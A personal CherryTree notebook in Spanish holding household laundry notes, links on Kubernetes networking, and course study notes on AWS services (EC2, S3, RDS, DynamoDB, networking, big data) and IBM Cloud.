<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="devops" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="#1e90ff" ts_creation="1619462339" ts_lastsave="1706379042">
    <rich_text>sacar guardapeluzas y limpiarlos
se separa la ropa en obscura y blanca
blanca con claros
primero va la blanca, chorro de vinagre, cucharada de vanish, chorro de clorox morado y tapa de jabon foca liquido
    suavitel cuando termine lavado, una tapa
negra, chorro de vinagre menos grande, 2 tapas de jabon liquido mas color negro y poquito jabon en polvo foca
    dos tapas de suavitel cuando las pida

calzones de leo y fany a mano
playeras amarillas con la blanca y sueter del diario

dansing.for.love@gmail.com


Network
</rich_text>
    <rich_text link="webs https://medium.com/@bijit211987/elevating-kubernetes-network-monitoring-with-istio-linkerd-and-envoy-2a3f4ab452dc">https://medium.com/@bijit211987/elevating-kubernetes-network-monitoring-with-istio-linkerd-and-envoy-2a3f4ab452dc</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://faun.pub/capturing-container-traffic-on-kubernetes-ee4a49b833b7">https://faun.pub/capturing-container-traffic-on-kubernetes-ee4a49b833b7</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://istio.io/latest/docs/setup/platform-setup/amazon-eks/">https://istio.io/latest/docs/setup/platform-setup/amazon-eks/</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://px.dev">https://px.dev</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://docs.tigera.io/calico/latest/getting-started/kubernetes/helm">https://docs.tigera.io/calico/latest/getting-started/kubernetes/helm</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://aws-ia.github.io/terraform-aws-eks-blueprints/patterns/istio/">https://aws-ia.github.io/terraform-aws-eks-blueprints/patterns/istio/</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://github.com/nicolaka/netshoot">https://github.com/nicolaka/netshoot</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://github.com/postfinance/kubenurse">https://github.com/postfinance/kubenurse</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://github.com/Stono/kconmon?tab=readme-ov-file">https://github.com/Stono/kconmon?tab=readme-ov-file</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://tridevreddy333.medium.com/deploying-zeek-in-kubernetes-1e15a20ddc4b">https://tridevreddy333.medium.com/deploying-zeek-in-kubernetes-1e15a20ddc4b</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://github.com/nirmata/kube-netc">https://github.com/nirmata/kube-netc</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://gist.github.com/etyp/dc9a9c620cc66f8d0344979e118b1721">https://gist.github.com/etyp/dc9a9c620cc66f8d0344979e118b1721</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://www.kubeshark.co/pricing">https://www.kubeshark.co/pricing</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://cilium.io">https://cilium.io</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://kubernetes.io/docs/concepts/cluster-administration/networking/">https://kubernetes.io/docs/concepts/cluster-administration/networking/</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://kubernetes.io/docs/concepts/services-networking/service/">https://kubernetes.io/docs/concepts/services-networking/service/</rich_text>
    <node name="Curso de cloud computing" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1619531922" ts_lastsave="1649170170">
      <rich_text># Que es EC2
- son practicamente maquinas virtuales
- las AMI son imagenes preconfiguradas
- Se pueden escoger diferentes configuraciones, llamadas instancias

# Lightsail
- es una opción a EC2
- es un vps (virtual private server), ip publica y dominio gratis
- este inicia en segundos
- ya contiene templates preconfigurados
- Tiene precio fijo y predecible, mas barato que EC2
- bases de datos
- respaldos
- restauracion
- multiregion

# Marketplace lightsail
- es muy parecido a digital ocean
- tiene varias plantillas pero también sistemas aparte
- sigue siendo responsabilidad del admin tener todo actualizado

# ECR, ECS, EKR
- ECS, permite correr contenedores de docker, solo se paga lo que se necesita, se puede escalar de acuerdo a las necesidades, microservicios o migraciones al cloud
- EKS, implementacion de kubernetes, permite crear el ambiente de workers, corre contenedores con herramientas tradicionales, se levanta el servicio y dentro del server creado se maneja la creación de servicios

# Lambda
- funciones de codigo que implementa microservicios
- dedicado a arquitectura microservicios
- tiene su propio endpoint
- no se administra nada por parte del usuario
- es autoescalable
- tiene un millón de llamadas gratis, no expira
- soporta: JS, python, java, C#, Go
- deben de llevar el menor numero de permisos
- NOTA: lo mas importante es aprender a hacer roles que tengan permisos limitados y solo los necesarios

# Elastic beanstalk
- es un endpoint, arquitectura de deploy, incluye todo lo necesario
- tiene un load balancer
- l1 o mas EC2 instances
- software de administración
- tiene soporte para varios lenguajes
- Soporte para docker, go, java se, tomcat, .net, nodejs, php, python, ruby


-----------------------------------------------------------------
# Version 2022
</rich_text>
    </node>
    <node name="Curso de storage" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617750952" ts_lastsave="1619722086">
      <rich_text>Storage en S3

Caracteristicas de S3
Almacenamiento de objetos
existen varios tipos:
- S3
- S3 IA
- S3 One Zone
- S3 Glacier
Alta durabilidad y disponibilidad

se divide en:
Bucket - donde se almacena
Objeto - el archivo guardado
Web estatica - sirve para servir paginas estativas
el bucket debe de estar lo mas cercano de nuestra infraestructura

Versionamiento
es el manejo que se puede tener estilo github, donde podemos regresar a varios archivos anteriores
los buckets deben de tener un nombre único, esto depende mas que de los que tenemos, son los que existen hasta de otros usuarios
en propiedades se activa el versionamiento de archivos
para ver las versiones hay que darle show en version

Sitios web estaticos
Se puede usar el dominio normal, Route53 para la gestión de dominios
se requiere:
- nombre, se debe llamar el bucket igual que el dominio
- archivo index y error
- se debe configurar el DNS

para activarlo se debe de ir a propiedades y activar el static website
se le debe de hacer publico a los objetos que usara el sitio web

Logs a nivel de objeto
Son usados para eventos, accesos y que acciones se hacen sobre los objetos se puede usar cloudwatch
se deben conectar a un servicio de cloudtrail, se puede crear otro bucket para el guaradado de los eventos

Transferencia acelerada
Es tomar la ventaja de las locaciones o CDN de amazon para cargar la informacion de forma mas rapida
en propiedades se muestra transferencia acelarada y se habilita, se identifica el mejor CDN con el mejor tiempo de respuesta, se da un endpoint para hacer esas cargas
mejores tiempos de carga de datos

Eventos S3
configuracion para manejar otros procesos
se puede usar SNS, sirve para el envio de notificaciones
se puede enviar a un SQS que puede procesar una lambda
se puede enviar directamente a la función lambda

Replicación
Sirve para recuperación de datos, para información crítica
esta es asincrona
en managment es donde se hace o activa la opción, se puede hacer por todo el bucket o por el subfolder
se puede pasar a un tipo distinto de almacenamiento
se utiliza muchas veces si la infraestructura esta en otra region

Clases de storage
tipos:
- s3 estandar, replicacion en 3 zonas
- s3 IA, replicado en 3 zonas
- s3 IA one zone, solo una zona
- S3 glacier, N/D

Ciclo de vida
- cambios entre storage de S3, S3-&gt;S3 IA-&gt;S3 glacier
- la modificacion es en lifecycle rule
- se pueden elegir actuales y previos
- lo minimo para envio es de 30 dias para cada uno de los cambios

Snowball
- Se usa a escala de PB
- en algunos paises aun no exiten
- Si excede a los PB se debe de usar Snowmobile
- cargas multiparte, &gt; 100MB
- 5GB de tipo PUT
- 5TB tamaño maximo en S3

Seguridad en S3
Encriptacion de objetos
tres tipos de server side:
- SSE-S3, amazon administra y gestiona las llaves, estandar AES-256, estan en IAM
- SSE-KMS, se crean en IAM, tienen factores de seguridad adicional, nosotros la creamos y amazon la administra, se elige que usuarios pueden usarla y crearla, estan en cloudtrail para auditarla, la rotacion depende del usuario
- SSE-C, el usuario provee las llaves, se generan en el sistema propio, el mismo usuario debe proveer la llave para revisar la data, las peticiones deben de ser por HTTPS, las llaves no se guardan en S3
- una de cliente

Politicas
- control de seguridad, para permisos y accesos dependiendo que se quiera para el usuario
- son de tipo JSON
- Statement es obligatorio
- Sid identificador de la politica
- Effect, allow o deny, es obligatorio
- Principal, especifica usuario o rol, es obligatorio

ACL en S3 (listas de control de acceso)
- permite que otras cuentas tengan accesos a los bukets
- se le puede dar acceso publico, se recomienda no hacer esto

# Storage gateway
- permite conectar on-premise con la nube, actua como intermediario con el data center fisico con la nube, es un almacenamiento hibrido
- Archivos, volumenes y Tapes
- almacenamiento hibrido
- se usa para backups, archiving, disaster recovery y cloud data processing
- usa protocolos NFS, SMB y iSCI
- se integra con S3, EBS y glacier
- se usa por medio de una maquina virtual
- se combina con toda la seguridad de AWS

# tipos, 3 tipos
- File gateway, accesos por SMB o NFS, es a nivel de objetos, tiene cache si se requiere que algo sea accedido de inmediato
- Virtual tape library, reemplaza el backup de cintas en el cloud, es data historica
- Volume gateway, crea cache de servicios locales, crea snapshots locales en AWS, son asincronos

# Elastic file system
- sistema de archivos
- sirve para conectar varios sistemas al mismo almacenamiento
- precio es por GB consumido
- Aumento y reduccion automatica
- Solo permite acceso a instancias Linux
- Permite IOPS
- Tiene mejor rendimiento de red
- Hay cifrado en reposo usando KMS

# Elastick block storage
- se pueden instalar sistemas y aplicaciones
- tiene replicacion
- manejo de diferentes cargas de trabajo
- solo se puede asociar a un solo EC2
- si es boot no se puede cifrar
- los adicionales si se pueden cifrar
- se monta a nivel de SO
- existen diferentes tipos
- se puede proteger el borrado
- el maximo es de 16TB

# Tipos
- GP2, discos de estado solido, proposito general, cargas de hasta 10000 IOPS, instancia entre 1GB y 16TB
- IO1, mas de 10000 IOPS, puede ser root, se usa para aplicacionse de altos volumenes de esscritura y lectura, bases de datos no relaciones
- ST1, big data, dataware, log process o streaming, no puede ser root, espacio entre 500GB y 16TB


errores: 
migracion de 5TB de info
que pasa con las versiones anteriores del versionamiento
siendo el CIO de una empresa seleccionar el tipo de almacenamiento
</rich_text>
    </node>
    <node name="IBM" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1619734546" ts_lastsave="1619823923">
      <rich_text># IBM cloud
- se puede conectar nuestro git con un toolchain que sirve para desplegar, muy parecido a CodeBuild, parece que tiene un web IDE donde se puede trabajar
- IBM cloud lite (dev), se pueden usar solo algunos servicios, gratis, no expira, 256MB de memoria para cloud foundry
- Pago por uso (test), 
- Subscripción (live), 
- son open source, son miembros fundadores de Apache
- Cloud foundry, sirve para desplegar servicios, virtualiza, ya tiene ambientes preinstalados
- microservicios, es construir un sistemas con diversos servicios escalables que son poliglotas (diversos lenguajes de programacion)
- se puede usar cloud foundry de dos formas
   → creación de aplicacion por la plataforma de los diversos lenguajes de programación
   → a traves del push, despliegue de push sobre linea de comando
- toolchain, permite prototipar sin costo
- el dominio ya puede estar siendo utilizado por otra persona{
- estos se pueden conectar a otros servicios de IBM
- el devops es el toolchain en IBM
- el pipeline usan jenkins, github para pushes
- se deben de ir habilitando los servicios
- usan eclipse Orion

# Economia de las API
- API Connect, solución para construir APIs en IBM cloud
- la economia de api es el valor que ofrece la rentabilidad de una empresa sobre sus datos expuestos
- Se garantiza un nivel de servicio
- Capacidades para provedores
- capacidades para los consumidores
- como interactuan entre ellos
- permite crear, depurar y deplegar api
- gestiona la seguridad
- componentes:
   → portal del desarrollador
   → api manager, guarda en parte la analitca
   → api gateway, no se interactua directamente, aqui se hacen las transacciones, como politicas de seguridad
   → entorno de desarrollo
- Catálogos, un listado de apis con documentación, se pueden hacer pruebas en linea
- Productos, este encapsula una o mas apis, sirve para registrar la aplicación
- Planes, hay diferenes tipos de planes, donde puede poner logica de consumo por precio
- Estandar que se usan;
   → Swagger 2.0
   → mensajes en JSON/XML
   → protocolos SOAP/REST
# Como hacer deploy de apps
- exite:
   → Build-from-the.scratch
      ⇒ runtimes, varios lenguajes donde se puede construir
      ⇒ boilerplates, se va mas adelante, se tiene contenedores donde estan preconfigurados con algunos otros servicios
   → Bring-your-own-app
      ⇒ CLI, teniendo el codigo propio
      ⇒ Botón de despliegue, aqui se puede usar con github, uso del toolchain

#IBM watson
- computación cognitiva, redes neuronales artificiales
   → proliferacion de datos
   → Economia de las API
   → La capacidad de procesamiento sobre la nube, aqui nace watson

ERRORES:
Después de desplegar una aplicación “starter” desde el catálogo, se puede acceder al código de muestra de la aplicación a través de la página “Getting Started”.
¿Cuál es el resultado de vincular una instancia de servicio a una aplicación Cloud Foundry en IBM Cloud?</rich_text>
    </node>
    <node name="rds" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1623801016" ts_lastsave="1625259642">
      <rich_text># Caracteristicas
- se tiene compatibilidad con:
   → aurora
   → mysql
   → mariadb
   → postgresql
   → oracle
   → mssql
- Caracteristicas:
   → backups automaticos de 1 a 35 dias de retencion
   → backups manuales, se pueden crear en cualquier momento y al eliminar la base
   → sistema de almacenamiento
      ⇒ proposito general (SSD)
      ⇒ Provisionado (SSD), uso intensivo de E/S
   → Cifrado de datos en reposo, se puede hacer a travez de un KMS
   → Actualizaciones automaticas de la BD
   → "DBLess"
- se pueden usar tokens con IAM, 10 a 20 conexiones por segundo
- monitoreo en tiempo real
- se pueden seleccionar varios tipos y tamaños de instancias
- oracle necesita licencia
- postgresql contiene diferentes plugins
- aurora esta optimizada para queries

# Backups y performance
- se tienen backs automaticos y manuales
- los manuales son responsabilidad del usuario, estos son incrementales, se manetienen si se borran la base de datos, se pueden mover de region
- los automaticos se crean a diario, las operaciones de E/S pueden quedar suspendidos, ser recomienda hacer uso de Deploy A/Z
- el precio depende del storage de la base de datos
- monitore de I/O, CPU, DD y memoria, num de conexiones
- replicas de lectura, mejorar el desempeño de la DB, no para Oracle y SQL Server
- IOPS provisionados
- elasticache, dividir la bd en mas pequeñas
- monitoreo d eperformance
- aws recomeinda Aurora
- despliegues multi AZ
   → despliegue en diferentes zonas
   → sirve para alta disponibilidad de la base
   → recomendadas para produccion
   → se compone de una master-standby
   → replicacion sincrona
   → failover automatico
   → conmutacion por error
   → replicacion entre AZ
   → El pricing es como tener 2
   → el Back se hace de DB standby

# Migraciones
- database migration service:
   → adaptar los recursos a la carga de trabajo, solo se paga lo que se usa en la migracion
   → no hay downtime
   → administra la arquitectura para la migracion
   → conmutación por error
   → los datos en reposo se cifran con KMS
   → si se requieren parches el mismo servicio los identifica
- puede estar en otro provedor
- se tiene un instancia intermedia que hace la replicacion y un target
- Homogeneas:
   → un origen con el mismo destino (el motor solo cambia la version pero no el tipo), aplica de mysql o postgresql a aurora
- Heterogenea:
   → Se cambia de motor completamente
   → se requiere hacer una conversion de schemas
   → se debe verificar la compatibilidad

# Aurora
- es el motor de datos mas robusto
- es una base de datos relacional
- 5 veces mejor que mysql y 3 que postgresql
- 64TB de storage
- 15 read replicas
- &lt; 10 ms replica lag
- monitoreo y failover
- usa dos endpoints:
   → el master
   → uno que es el de replica, cada replica tendra su propio endpoint, pero se tiene un tercero que especifica todo
- tiene autoreparacion, fallos de disco, guardando la data
- cache-warm, pre calienta la cache al iniciar, consultas mas comunes
- recuperación de desastres, si falla la principal toma una de las replicas y la convierte en principal
- Serverless:
   → se configura una capacidad minima y maxima
   → compatible con mysql 5.6
   → se puede poner que este inactiva cuando no se use

# DynamoDB
- caracteristicas:
   → servicio de bases de datos NoSql
   → completamente administrado
   → compuesto de varios nodos
   → disrtibuida en varias regiones
   → baja latencia
   → almacenamiento en cache
   → completamente escalable
   → unidades de lectura, bloques de 4kb por segundo
   → unidades de esritura, bloques de 1kb por segundo
   → se replica en diferentes locaciones
   → se deben de especificar las capacidades de lectura y escritura
   → la unidad fundamental son las tablas
   → se compone de item, coleccion de atributos
   → particiones son el espacio de almacenamiento que se dan por una llave, nos permite identificar un elemento en especifico
   → sort key, es una llave secundaria para el ordenamiento
   → local secondary index
- consistencia:
   → eventual:
      ⇒ puede no responder algo que recientemente se creo
      ⇒ consume 4KB de bloques por segundo
   → fuerte de lectura:
      ⇒ se toma la mas reciente, se consume el doble de la eventual
      ⇒ este son 8KB
- Casos de uso:
   → mobile
   → IoT
   → Web
   → Gaming
   → Manejo de sesiones
   → Real time

# Dynamo (rendimiento)
- particiones e indices
   → los datos se almacenan en particiones
   → dynamodb se encarga de asignar las particiones de acuerdo al desempeño aprovicionado
   → aumenta el tamaño o el numero de parciones
- limites:
   → las particiones se aumenta al llegar a las 10Gb o 3 mil de lectura o mil de escritura
   → una llave principal, se toma y se crea una funcion hash, determina en que particion se guarda
   → la preferencia es que la llave sea mas random
- clave compuesta:
   → se usan dos llaves la principal y la de ordenamiento
   → la primera define la particion y la segunda como estara acomodada
- operaciones
   → scan:
      ⇒ es la menos eficiente
      ⇒ examinda la tabla o inidce secundario en su totalidad
      ⇒ no usar con tablas grande
      ⇒ examina cada objeto
      ⇒ consume muchas unidades de lectura
      ⇒ realiza lecturas consistentes puede devolver hasta 1MB de datos (una pagina)
      ⇒ aumento de costos
      ⇒ hacer distribuciones de requests
      ⇒ es malo hacer operaciones grandes
      ⇒ se pueden mejorar:
         • se puede poner un limite para los resultados
         • se pueden duplica tablas para no afectar las principales
   → queries
      ⇒ busca elementos basados en la llave principal
      ⇒ puede consultar tablas o indices secundarios
      ⇒ se pueden usar condiciones
      ⇒ se determina por clave que valores se leeran
      ⇒ se puede expeficar el nombre de la clave y el valor
      ⇒ limites:
         • limita el numero de resultados
         • no devuelve la cantidad de lectura del query

# Stream y replicacion
- proporciona una secuencia ordenada, se mantiiene el registro de todo lo que se modifique en un campo, esto para que sea en tiempo real
- se amplia el poder de dynamo con replicas entre regioes, analisis con redshift, y muhcos otros escenarios
- captura en orden cronologico, de las modificaciones lo almancena por 24 hr.
- las aplicaciones pueden obtener accesos de como estaban
- contiene informacion sobre la modificacion
- DAX:
   → acelerator, es un cache complemtamente administrado y de alta disponibilidad
   → tiene rendimiento de hasta 10 veces
   → soporta millones de peticiones
   → permite cifrado
   → hasta 10 nodos
   → instancias small y medium y de tipo R (opt. de memoria)
   → se puede seleccionar la region</rich_text>
    </node>
    <node name="networking" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625236500" ts_lastsave="1625420838">
      <rich_text># Introduccion
- Una familia de servicios
- optimización de la red
- componentes:
   → VPC, red privada virtual
   → Cloud front, acelerados de entrega de contenido web
   → Route 53, servidor de nombres de aws
   → API Gateway, direccion publica que conecta servicios

# Servidores y CDN
- Domain Name System
   → la computadora no sabe de nombres
   → pero entiende las IPV4 e IPV6
   → El nombre se traduce a una dirección tipo: 1.2.3.4
   → route 53 es el DNS / NS de aws
- CDN
   → red de distribucion de contenido, copias de sitios para que cargue mas rapido
   → pueden ser HTML, JS, CSS, imagenes y otros
   → cloudfront de aws hace esto trabajo
- Endpoint
   → un punto de contacto con el internet y la infraestructura interna

# Arquitectura en aws
- usuarios y clientes
   → mobile
   → tableta
   → computadora
   → web services
- API Gateway
   → EC2
   → aws lambda
   → otros servicios que son accesibles por un endpoint
- API gateway cache
- CloudWatch
- VPC:
   → un red privada que proporciona amazon, es virtual
   → se compone de subredes
   → se pueden asignar IPs estaticas “internas” (gratis)
   → si se tiene una IP publica y se reinicia el server cmbia de IP
   → se pueden asignar puertos (en securities group)
   → se pueden asignar multiples ip a la misma instancia
   → se le puede asignar una IPV6
   → se pueden cambiar grupos de seguridad
   → toda instancia de amazon tiene libre acceso a internet
   → controles de seguridad a nivel de red ACLs
   → si se pierde la llave se detiene la instancia se crea una copia, se restaura y se levanta con una nueva llave
   → Jumpbox

CloudFront
- es una implementacion de CDN de AWS
- estan en varios puntos geograficos
- se sincroniza rapidamente con los datacenter
- se usa mediaconvert dependiendo del dispositivo que requiera
- tambien lo manipula a nivel de velocidad de internet
- es economico, se cobra por lo que se usa
- se podria desarrollar con instancias ec2 en varias regiones (complicado)
- se usa en cualquier archivo que pueda ser compartido por un servidor web
- permite niveles de calidad de distribucion
- el contenido va sobre ssh
- se puede enviar codigos de lambda

# Route53
- es un servicio de nombre de dominio
- de route53 a ELB a las instancias
- registro de dominios
- alta disponibilidad en dominios
- se puede definir cual es el servidor principal para tener alta disponibilidad
- se puede configurar para tener baja latencia

# Api Gateway
- endpoint abierto que soporta peticiones http
- se devuelve la informacion que esta en cache
- si no esta en cache:
   → redirecciona a una funcion lambda
   → servidor web en EC2
   → elastic beanstock

</rich_text>
    </node>
    <node name="despliegue de apps" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625423192" ts_lastsave="1625494503">
      <rich_text># Historia:
- apps de escritorio:
   → linea de comandos
   → base propia
- cliente-servidor:
   → recibe conexiones de muchos clientes
   → accede al servidor y consume y lee información
- monoliticas vs microservicios:
   → monoliticos: se tiene todo en un solo archivo, despues el back y front todo en el mismo servidor
   → microservicos: separemos los componentes de las apps, cada cosa en su “servidor”, filosofia UNIX

# Stacks:
- LAMP:
   → linux
   → apache
   → mysql
   → php
- MERN:
   → Mongo
   → Express
   → Reac
   → Node
- JOTL:
   → Java
   → Oracle
   → Tomcat
   → Linux
- JAM:
   → JavaScript
   → API
   → Markup

# Despliegues
- Github:
   → nombre de usuario.github.com
   → tiene que ser publico
- surge.sh
   → install npm surge
   → pide usuario y contraseña
   → surge no da ssl
- netlify.com:
   → se puede conectar con github
   → pide el repo a usar
- vercel.com
   → se conecta igual con github y se agrega el repo, parece ser una buena opcion para frameworks
   → me dio opcion de usar empresa o usuario
   → tiene acceso a fallos y revision de deploys

# Bases de datos
- mongo atlas
- elephant

# Heroku
- se pueden desplegar backends
- es un PAAS</rich_text>
    </node>
    <node name="big data" unique_id="19" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625508695" ts_lastsave="1625785979">
      <rich_text># Intro
- en la nube se puede tener un crecimiento escalable
- crecimiento por demanda, servicios escalables
- se tienen procesos automatizados
- solo se cobra por lo que se use de recursos, costo por demanda
- flexibilidad existen varios para proyectos de bigdata
- almacenamiento, se tiene que seleccionar donde se almacenara
- de la extracción se tienen que tener en cuenta las herramientas y de donde se obtendra la data
- ingesta: tomar la información y alimentar otros sistemas
- validación, proporcionar caracteristicas y garantias, de que la informacion es precisa
- verificación: que los diferentes tipos de datos sea exacta e inconsistente
- test: se ejecutan sobre un subset de la data para garantizar que el proceso este bien

condiciones son opcionales, sirve para crear algunos recursos si otros ya estan
transform opcional, son para serverles
recursos, es obligatorio y es para saber que se va a crear

# Arquitecturas
- Lambda:
   → se atribuye a Nathan Marz, arquitectura escalable, tolerante a fallos y de procesamientos de datos
   → robusta, soporta multiples cargas de trabajo
   → compuesta de 3 capas, batch, serve y speed
   → se divide la informacion en 2 servicios, batch y speed
   → alimentan queries y visualizaciones
   → se aumenta la complejidad en cargas de administración
   → es muy comun
- kappa:
   → presentada por Jay Krepsen en 2014
   → evoluciona de la lambda
   → no tiene capa de batch
   → todo es un streaming
   → informacion origen no modificada
   → solo un flujo de procesamiento
   → capaz de reprocesar
   → llega el origen de datos y se procesa en tiempo real
- batch
   → parte especifica de la arquitectura lambda
   → entra la informacion, la procesa y da una salida
   → procesar data desde el dia prensenta hacia atras
   → se puede procesar data de dias anteriores
   → se pueden alimentar sistemas de visualizacion

# Extracción de la información
- como se llevan los datos que se tiene a cloud
- SDK
   → usando un lenguaje de programación
- CLI
   → utiliza el CLI de aws
- Servicios
   → hay varios servicios que pueden recibir y extraer informacion
- API GAteway
   → es una puerta de enlace entre la data que se produce con la plataforma de nube
   → puede manejar ciento de miles de llamadas recurrentes
   → previene ataques de DNS
- se puede configurar pra que por medio de operaciones se mande a un función lambda
- Storage gateway:
   → permite informacion desde on-premise a la nube
   → se pueden enviar los logs a s3 para procesarlos
   → funciona en una VM instalada
- Kinesis data streams
   → es como pup/sub de GCP
   → recopilar y procesar grandes cantidades de stream.. tiempo real
   → procesamiento de logs, markets data feeds y web clickstream
   → se utiliza para hacer agregaciones
   → se compone de:
      ⇒ data record, unidad fundamental
      ⇒ retention period, periodo de retención, tiempo que durara la data
      ⇒ producer, se encarga de poner el data record en kinesis
      ⇒ consumes, toma el data procesado y lo deja donde se use
      ⇒ shard, es una secuencia de Data records dentro de un stream
      ⇒ Partition key, se usa para agrupar los data records
- Kinesis firehouse
   → servicio completamente administrado para la entrega de datos
   → se pueden usar lambdas para hacer las transformaciones
   → se puede integrar a S3, redshift, ElasticSearc y Splunk
- MSK
   → servicio apache kafka administrado en la nube
   → se despliega en cluster y tiene autoreparacion de nodos
   → usaba la version 1.1.1 de kafka
   → se usa cuando se requiere interactuar con apps de terceros
   → se compone de broker nodes, cuantos y donde
   → zookeeper mantiene datos de nombres y configuraciones, este es un nodo
   → nodos de zookeeper, siempre se tiene uno

# Transformación
- Glue
   → es un servicio totalmente administrado
   → provee un contexto de spark para ejecutar trabajo en Python o Scala
   → Se encarga de la creación del glue catalog, este puede ser consultado por otros servicios como Athena
   → usa DPUs, que son 4vCPU y 16GB de ram, la mínima de desarrollo es de dos
   → glue catalog, es un almacen de metadatos persistentes, cada cuante tiene uno
   → Crawler y classifier escanea e identifica la información de origen y crea su glue catalog
- Zeppelin:
   → permite notebook web que puede hacer analisis, SQL y mas cosas
   → permite ejecutar SQL, python y spark
   → tiene integracion con AWS, se puede integrar con GLUE y con EMR
   → en seguridad se le pueden especificar librerias de python y scala (en el endpoint)
   → pide llave para conectarse por ssh
- EMR
   → Elastic map reduce
   → es un cluster donde se corren cargas de trabajo grandes
   → son servicios administrados basados en Hadoop
   → Corre apps de map reduce, spark y otras opciones que usa hadoop
   → provee integracion con otros servicos de aws, s3, redshif
   → se corre sobre el cluster el script
   → tiene pasos que se ejecutan para procesar la data
   → se compone de un master y core nodes para la información en HDFS y task nodes de procesamiento
   → se puede usar autoscaling
- AWS Lambda
   → servicio para el real time
   → solo puede hacer 20000 llamadas de concurrencia
   → se puede integrar con Kinesis firehouse
   → con sqs suele utilizarse para entornos de alto procesamiento para evitar throttles
   → se puede actualizar usando codepipeline y boto3
   → librerias de python para monitoreo de ejecución de código
   → al superar los reintentos se puede enviar a una cola SQS o a un topic SNS
   → los layer sirven para:
      ⇒ cuando se manejan muchas librerias y muchas lambdas se pueden usar para compartir las utilidades

# Carga de información
- Athena:
   → permite hacer consultas interactivas para S3 de tipo SQL
   → es serverless
   → provee interacción con otros servicios como S3, Redshift, Dynamos y Kinesis
   → se puede integrar con JDBC como sql workbench
   → las queries pueden ser guardadas
   → permisos granulares por base de datos y tablas
- Redshift
   → es un data warehouse o un data lake, centra la infromacion que viene de varias fuentes de información
   → repositorio de datos centralizados, tiene una cantidad enorme de raw-data en formato nativo
   → Data mart, es un subset de datawarehouse que hace una tarea especifica
   → sirve para analizar y tomas mejores decisiones
   → diferentes fuentes de datos
   → diferentes stakeholders
   → es una base de datos columnar
   → mejora el I/O de los discos
   → se usa sobre consultas de analitica
   → servicio desplegado a nivel de PB
   → el servicio se lanza en un cluster de instancias
   → sirve para consultas complejas de sql
   → esta basado en postgresql
   → hace compresión de la data para optimizar I/O
   → utiliza cahce para ciertos tipos de valores
- AWS lake formation
   → facilita la creacion de un data lake
   → tiene integracion con diferentes fuentes usando JDBC
   → identifica origenes y crea tablas (crawlers)
   → se encarga de orquestar los ETL de glue
   → limpia y elimina la data duplicada con FindMatch
   → Optimiza las particiones de S3 para consultas mas eficientes
   → cifrado automatico de la data en S3
   → control de permisos por usuario por bases, tablas y columnas
   → logging a nivel de auditorio registrados en cloudtrail
   → owners; permite crear el lake para controlar los usuarios
   → descubre data relevanta para implementar analisis
   → analytics desde otros servicios como EMR y redshift

# Consumo de información
- ElasticSearch
   → visualización de información
   → es un motor de busqueda basado en Lucene, busca texto complejo y JSON sin esquema
   → se despliega en un cluster de AWS compuesto por varios nodos
   → la solución viene integrada con Kibana y Logstash
   → Se puede integrar con AWS Cognito para manejo de usuarios
   → Se pueden cifrar datos en reposo
   → Puede recibir información de Kinesis firehouse y lambda
   → el indice, es una base de datos que guarda informacion que llega, es un nombre lógico que distribuye en un shard
   → Estructura, ES-&gt;indices-&gt;types-&gt;Documents with properties
   → Shard, un índice se puede dividir en multiples shards y setos se almacenan en diferentes nodos
   → se recomienda usar instancias tipo I
   → El dimensionamiento del Cluster es esencial y fundamental (Cantidad de Shards, almacenamiento y la cantidad de índices)
   → Completamente integrado con LogStage y Kibana para temas de visualización
   → Siempre en ambientes productivos se debe habilitar el Cifrado de la data (De nodo a nodo y en reposo)
   → Una medida extra de seguridad. Hacer uso de Amazo Cognito para que los usuarios que van a trabajar en el cluster les aparezca el usuario y password.
- Kibana
   → se integra con ElasticSearch
   → provee diferentes opciones de visualización
   → permite el uso de plugins de terceros para visualización y analítica
- QuickSight
   → es el mas dedicado a visualización
   → es para bussiness intelligence
   → cuenta con un cliente para cel
   → puede escalar hasta 10000 usuarios y su cobro es por demanda
   → usa un motor de machine learning llamado SPICE
   → usando el api permite realizar el embebido en apps
   → permite integracion con variedad de servicios de AWS

# Seguridad, orquestacion y
- a tener en cuenta:
   → cifrado en todos los servicios posibles
   → permisos, todos los usuarios deben de tener permisos basados en granularidad
   → servicios, utilizar servicios adeministrados y servicios de seguridad, serverless
   → monitoreo, todos los servicios deben de registrar los logs
   → contingencia replicacion de datos, pruebas de multiregion, almacenar data historica
   → utilizar datsos sobre la data que llega
- AWS Macie:
   → aprendizaje automatico para conectarse a las fuentes de datos, clasifica, descubre y protege datos privados
